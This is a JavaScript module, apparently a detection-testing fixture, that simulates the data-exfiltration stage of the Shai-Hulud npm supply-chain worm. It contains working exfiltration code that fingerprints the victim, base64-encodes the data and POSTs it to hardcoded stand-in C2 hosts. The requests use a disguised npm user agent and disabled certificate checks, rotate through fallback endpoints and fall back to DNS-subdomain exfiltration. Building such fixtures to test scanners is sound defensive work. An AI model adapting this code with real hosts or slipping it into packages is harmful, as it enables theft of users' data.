/**
 * SHAI-HULUD SIMULATION - Stage 3: Data Exfiltration
 * ⚠️ TEST ONLY - Simulates exfiltration patterns
 * 
 * Techniques simulated:
 * - Hardcoded C2 domains (Semgrep: CWE-798, GuardDog: hardcoded-url)
 * - HTTPS POST exfiltration (GuardDog: exfiltration-pattern)
 * - DNS exfiltration (advanced technique)
 * - Multiple fallback endpoints (resilience)
 */

'use strict';

const https = require('https');
const http = require('http');
const dns = require('dns');
const crypto = require('crypto');

// Hardcoded C2 endpoints - Semgrep: CWE-798 hardcoded-credentials
// GuardDog: hardcoded-url, suspicious-domain
// These use .test TLD (RFC 2606) - guaranteed not to resolve
const C2_ENDPOINTS = [
    { host: 'c2.shai-hulud-attack.test', port: 443, protocol: 'https' },
    { host: 'exfil.malware-collector.test', port: 443, protocol: 'https' },
    { host: 'data.evil-npm-package.test', port: 8443, protocol: 'https' },
    // Fallback HTTP (less suspicious in some envs)
    { host: 'backup.attacker-server.test', port: 80, protocol: 'http' }
];

// DNS exfiltration domain - advanced technique
// Encodes data in subdomain queries
const DNS_EXFIL_DOMAIN = 'dns-exfil.attacker.test';

/**
 * Generate unique victim identifier
 * Used to track victims across exfil attempts
 */
function generateVictimId(data) {
    const hash = crypto.createHash('md5');
    hash.update(data.hostname + data.username + data.homedir);
    return hash.digest('hex').substring(0, 12);
}

/**
 * Encode data for exfiltration
 * Real attacks use various encoding/encryption
 */
function encodePayload(data) {
    // Base64 encode - GuardDog: base64-encoded-strings
    const json = JSON.stringify(data);
    return Buffer.from(json).toString('base64');
}

/**
 * Attempt HTTPS exfiltration
 * Primary exfil method
 */
function exfilHTTPS(endpoint, payload, victimId) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: endpoint.host,
            port: endpoint.port,
            path: `/collect/${victimId}`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/octet-stream',
                'Content-Length': Buffer.byteLength(payload),
                'X-Victim-ID': victimId,
                'User-Agent': 'npm/8.0.0 node/v18.0.0'  // Disguise as npm
            },
            timeout: 5000,
            rejectUnauthorized: false  // Accept self-signed certs - suspicious!
        };
        
        const proto = endpoint.protocol === 'https' ? https : http;
        const req = proto.request(options, (res) => {
            if (res.statusCode === 200) {
                resolve(true);
            } else {
                reject(new Error(`HTTP ${res.statusCode}`));
            }
        });
        
        req.on('error', reject);
        req.on('timeout', () => reject(new Error('timeout')));
        req.write(payload);
        req.end();
    });
}

/**
 * DNS exfiltration fallback
 * Encodes small data chunks in DNS queries
 * Harder to detect/block than HTTPS
 */
function exfilDNS(data, victimId) {
    return new Promise((resolve) => {
        // Encode small payload in subdomain
        // Format: <chunk>.<victimId>.<domain>
        const chunk = Buffer.from(victimId).toString('hex');
        const query = `${chunk}.${victimId}.${DNS_EXFIL_DOMAIN}`;
        
        // DNS lookup triggers exfil
        dns.resolve(query, 'A', (err) => {
            // We don't care about the response
            // The query itself exfiltrates data
            resolve(!err);
        });
    });
}

/**
 * Main exfiltration function
 * Tries multiple endpoints with fallback
 */
async function send(data) {
    const victimId = generateVictimId(data);
    const payload = encodePayload(data);
    
    console.log('[SIMULATION] Attempting exfiltration for victim:', victimId);
    console.log('[SIMULATION] Payload size:', payload.length, 'bytes');
    
    // Try each endpoint until one succeeds
    for (const endpoint of C2_ENDPOINTS) {
        try {
            console.log('[SIMULATION] Trying', endpoint.protocol + '://' + endpoint.host);
            await exfilHTTPS(endpoint, payload, victimId);
            console.log('[SIMULATION] Exfil succeeded to', endpoint.host);
            return true;
        } catch (e) {
            console.log('[SIMULATION] Exfil failed:', e.message);
            // Continue to next endpoint
        }
    }
    
    // Fallback to DNS exfil
    console.log('[SIMULATION] Falling back to DNS exfiltration');
    await exfilDNS(data, victimId);
    
    return false;
}

module.exports = {
    send,
    C2_ENDPOINTS,
    DNS_EXFIL_DOMAIN,
    generateVictimId,
    encodePayload
};
